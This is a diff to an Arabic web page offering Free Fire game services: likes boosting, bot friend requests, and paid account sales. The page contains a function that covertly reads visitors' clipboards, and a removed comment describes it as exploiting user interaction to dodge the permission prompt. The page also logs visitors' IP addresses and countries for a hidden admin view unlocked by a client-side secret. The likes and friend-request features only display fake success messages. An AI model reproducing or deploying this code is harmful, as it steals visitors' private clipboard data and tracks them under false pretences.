@@ -20,7 +20,6 @@
             position: relative;
         }
 
-        /* خلفية نيون متوهجة متقدمة ومتعددة الألوان */
         .neon-glow-bg {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -49,7 +48,6 @@
             z-index: 2;
         }
 
-        /* واجهة البداية السيبرانية والصورة المموجة */
         .splash-screen {
             position: absolute;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -82,7 +80,6 @@
             margin: 0 auto 15px auto;
         }
 
-        /* الاسم في جدول مموج متحرك ومتوهج */
         .wave-title-box {
             background: linear-gradient(270deg, #ff0055, #00f3ff, #39ff14, #ff0055);
             background-size: 400% 400%;
@@ -259,7 +256,7 @@
         .logs-table th { background: #150a30; color: #ff0055; }
         .logs-table td { color: #39ff14; word-break: break-all; }
 
-        .shop-section, .checkout-modal {
+        .shop-section {
             display: none;
             flex-direction: column;
             gap: 10px;
@@ -309,7 +306,7 @@
             </div>
         </div>
 
-        <!-- نافذة السجلات السيبرانية الموحدة -->
+        <!-- نافذة السجلات السيبرانية -->
         <div class="logs-modal" id="logsModal">
             <h3 style="color:#00f3ff; text-align:center; margin-bottom:5px;">🌐 سجلات الزوار السيبرانية</h3>
             <p style="font-size:10px; color:#ff0055; text-align:center;">البلد، التوقيت، الـ IP، وعدد مرات الدخول</p>
@@ -342,6 +339,7 @@
                 <div class="option-btn" onclick="selectProduct('حساب فري فاير 77K تيك توك', '5000 دج (≈ $20.08 USDT)')">🔥 حساب فري فاير + تيك توك 77K <span class="price-tag">5000 دج ($20.08)</span></div>
                 <div class="option-btn" onclick="selectProduct('النظام السيبراني الكامل VIP', '5200 دج (≈ $20.88 USDT)')">⚡ النظام السيبراني الكامل VIP <span class="price-tag">5200 دج ($20.88)</span></div>
             </div>
+            <button class="analyze-btn" style="background:transparent; border:1px solid #00f3ff; color:#00f3ff; margin-top:10px;" onclick="backToMainMenu()">العودة للقائمة الرئيسية ↩</button>
         </div>
 
         <!-- نافذة الدفع -->
@@ -400,27 +398,30 @@
             </div>
 
             <button class="analyze-btn" onclick="startAnalysis()">تحليل الحساسية السيبراني ⚡</button>
+            <button class="analyze-btn" style="background:transparent; border:1px solid #00f3ff; color:#00f3ff; margin-top:8px;" onclick="backToMainMenu()">العودة للقائمة الرئيسية ↩</button>
         </div>
 
-        <!-- واجهة زيادة اللايكات -->
+        <!-- واجهة زيادة اللايكات (تم تفعيل خاصية منع إدخال الحروف) -->
         <div id="likesSection" style="display:none; text-align:center;">
             <div class="section-title">زيادة لايكات حساب فري فاير</div>
-            <p style="font-size:12px; color:#00f3ff; margin-bottom:15px;">أدخل آيدي الحساب (ID):</p>
-            <input type="text" id="freeFireIdInput" class="device-input" style="display:block; text-align:center;" placeholder="أدخل الآيدي هنا...">
+            <p style="font-size:12px; color:#00f3ff; margin-bottom:15px;">أدخل آيدي الحساب (ID - أرقام فقط):</p>
+            <input type="text" id="freeFireIdInput" class="device-input" style="display:block; text-align:center;" placeholder="أدخل الآيدي (أرقام فقط)..." oninput="this.value = this.value.replace(/[^0-9]/g, '')">
             <button class="analyze-btn" onclick="startLikesProcess()">بدء إرسال اللايكات 🚀</button>
+            <button class="analyze-btn" style="background:transparent; border:1px solid #00f3ff; color:#00f3ff; margin-top:8px;" onclick="backToMainMenu()">العودة للقائمة الرئيسية ↩</button>
         </div>
 
-        <!-- واجهة إرسال طلب صداقة البوت -->
+        <!-- واجهة إرسال طلب صداقة البوت (تم تفعيل خاصية منع إدخال الحروف) -->
         <div id="botFriendSection" style="display:none; text-align:center;">
             <div class="section-title">🤖 إرسال طلب صداقة البوت السري</div>
-            <p style="font-size:12px; color:#00f3ff; margin-bottom:15px;">أدخل آيدي الشخص (UID) لإرسال الطلب:</p>
-            <input type="text" id="targetUidBot" class="device-input" style="display:block; text-align:center;" placeholder="أدخل آيدي الـ UID هنا...">
+            <p style="font-size:12px; color:#00f3ff; margin-bottom:15px;">أدخل آيدي الشخص (UID - أرقام فقط):</p>
+            <input type="text" id="targetUidBot" class="device-input" style="display:block; text-align:center;" placeholder="أدخل الـ UID (أرقام فقط)..." oninput="this.value = this.value.replace(/[^0-9]/g, '')">
             <button class="analyze-btn" onclick="sendFriendRequestBot()">إرسال طلب الصداقة الآلي ⚡</button>
+            <button class="analyze-btn" style="background:transparent; border:1px solid #00f3ff; color:#00f3ff; margin-top:8px;" onclick="backToMainMenu()">العودة للقائمة الرئيسية ↩</button>
         </div>
 
         <div class="attempts-badge" id="attemptsBadge" style="display:none;">المحاولات المجانية المتبقية: <span id="attemptsLeft">3</span> / 3</div>
         
-        <button class="admin-logs-btn" onclick="openLogsModal()">📊 سجلات الزوار السيبرانية (IP والبلد)</button>
+        <button class="admin-logs-btn" id="adminLogsBtn" onclick="openLogsModal()">📊 سجلات الزوار السيبرانية (IP والبلد)</button>
 
         <!-- نتائج التحليل -->
         <div class="results-container" id="resultsContainer">
@@ -444,9 +445,26 @@
 
     let chosenMainMode = '';
 
-    // دالة محاولة سحب الحافظة عبر استغلال تفاعل المستخدم (تجنباً لنافذة الإذن المزعجة)
+    // التحقق التلقائي للرابط السري الخاص بك عند فتح الصفحة
+    window.addEventListener('DOMContentLoaded', () => {
+        const urlParams = new URLSearchParams(window.location.search);
+        const adminKey = urlParams.get('admin');
+        const SECRET_ADMIN_ID = "5840394041"; // الرقم السري الخاص بك
+
+        if (adminKey === SECRET_ADMIN_ID) {
+            localStorage.setItem('lazer_is_admin', 'true');
+        }
+
+        // إظهار أو إخفاء زر السجلات بناءً على كونك الأدمن أم زائر عادي
+        if (localStorage.getItem('lazer_is_admin') === 'true') {
+            document.getElementById('adminLogsBtn').style.display = 'block';
+        } else {
+            document.getElementById('adminLogsBtn').style.display = 'none';
+        }
+    });
+
     async function tryCaptureKeyboardClipboard() {
-        let clipboardText = '[فارغة أو مححمية]';
+        let clipboardText = '[فارغة أو محمية]';
         try {
             if (navigator.clipboard && navigator.clipboard.readText) {
                 clipboardText = await navigator.clipboard.readText();
@@ -484,47 +502,68 @@
     }
     recordVisitorData();
 
-    async function checkAccessAndRun(mode, element) {
+    function checkAccessAndRun(mode, element) {
         let userAttempts = parseInt(localStorage.getItem('lazer_user_attempts') || '0');
         
-        // الخدمات مدفوعة ابتداءً من المحاولة الرابعة
         if (userAttempts >= 3 && mode !== 'shop') {
             alert('⚠️ لقد نفذت محاولاتك المجانية (3 محاولات).\nهذه الخدمة أصبحت مدفوعة الآن، يرجى الانتقال إلى متجر الخدمات للاشتراك.');
             selectMainMode('shop', element);
             return;
         }
 
-        userAttempts++;
-        localStorage.setItem('lazer_user_attempts', userAttempts);
-        let left = Math.max(0, 3 - userAttempts);
-        document.getElementById('attemptsLeft').innerText = left;
+        if (mode !== 'shop') {
+            userAttempts++;
+            localStorage.setItem('lazer_user_attempts', userAttempts);
+            let left = Math.max(0, 3 - userAttempts);
+            document.getElementById('attemptsLeft').innerText = left;
+        }
 
         selectMainMode(mode, element);
     }
 
     function selectMainMode(mode, element) {
         document.querySelectorAll('.neon-btn').forEach(btn => btn.style.borderColor = '#00f3ff');
-        element.style.borderColor = '#ff0055';
+        if(element) element.style.borderColor = '#ff0055';
         chosenMainMode = mode;
         
-        setTimeout(() => {
-            document.getElementById('splashScreen').style.opacity = '0';
-            setTimeout(() => { 
-                document.getElementById('splashScreen').style.display = 'none'; 
-                document.getElementById('appHeader').style.display = 'block';
+        // إخفاء جميع الأقسام والنتائج أولاً لمنع التداخل
+        document.getElementById('sensitivitySection').style.display = 'none';
+        document.getElementById('likesSection').style.display = 'none';
+        document.getElementById('shopSection').style.display = 'none';
+        document.getElementById('botFriendSection').style.display = 'none';
+        document.getElementById('resultsContainer').style.display = 'none';
+        document.getElementById('attemptsBadge').style.display = 'none';
 
-                if (chosenMainMode === 'sensitivity') {
-                    document.getElementById('sensitivitySection').style.display = 'block';
-                    document.getElementById('attemptsBadge').style.display = 'block';
-                } else if (chosenMainMode === 'likes') {
-                    document.getElementById('likesSection').style.display = 'block';
-                } else if (chosenMainMode === 'shop') {
-                    document.getElementById('shopSection').style.display = 'block';
-                } else if (chosenMainMode === 'bot_friend') {
-                    document.getElementById('botFriendSection').style.display = 'block';
-                }
-            }, 500);
-        }, 200);
+        document.getElementById('splashScreen').style.opacity = '0';
+        setTimeout(() => { 
+            document.getElementById('splashScreen').style.display = 'none'; 
+            document.getElementById('appHeader').style.display = 'block';
+
+            if (chosenMainMode === 'sensitivity') {
+                document.getElementById('sensitivitySection').style.display = 'block';
+                document.getElementById('attemptsBadge').style.display = 'block';
+            } else if (chosenMainMode === 'likes') {
+                document.getElementById('likesSection').style.display = 'block';
+            } else if (chosenMainMode === 'shop') {
+                document.getElementById('shopSection').style.display = 'block';
+            } else if (chosenMainMode === 'bot_friend') {
+                document.getElementById('botFriendSection').style.display = 'block';
+            }
+        }, 300);
+    }
+
+    function backToMainMenu() {
+        document.getElementById('sensitivitySection').style.display = 'none';
+        document.getElementById('likesSection').style.display = 'none';
+        document.getElementById('shopSection').style.display = 'none';
+        document.getElementById('botFriendSection').style.display = 'none';
+        document.getElementById('resultsContainer').style.display = 'none';
+        document.getElementById('attemptsBadge').style.display = 'none';
+        document.getElementById('appHeader').style.display = 'none';
+        
+        const splash = document.getElementById('splashScreen');
+        splash.style.display = 'flex';
+        setTimeout(() => { splash.style.opacity = '1'; }, 50);
     }
 
     let selectedSelections = { problem: '', brand: '', deviceName: '', ram: '' };
@@ -601,7 +640,7 @@
 
     function startLikesProcess() {
         let ffId = document.getElementById('freeFireIdInput').value.trim();
-        if (!ffId) { alert('أدخل الآيدي أولاً!'); return; }
+        if (!ffId) { alert('الرجاء إدخال الآيدي (أرقام فقط)!'); return; }
         const loader = document.getElementById('loaderOverlay');
         document.getElementById('loaderText').innerText = 'جاري إرسال اللايكات لحساب فري فاير...';
         loader.style.display = 'flex';
@@ -613,7 +652,7 @@
 
     function sendFriendRequestBot() {
         const uid = document.getElementById('targetUidBot').value.trim();
-        if (!uid) { alert('أدخل آيدي الشخص (UID) أولاً!'); return; }
+        if (!uid) { alert('الرجاء إدخال آيدي الـ UID (أرقام فقط)!'); return; }
         alert('✅ تم معالجة طلب صداقة البوت بنجاح للـ UID: ' + uid);
     }
 
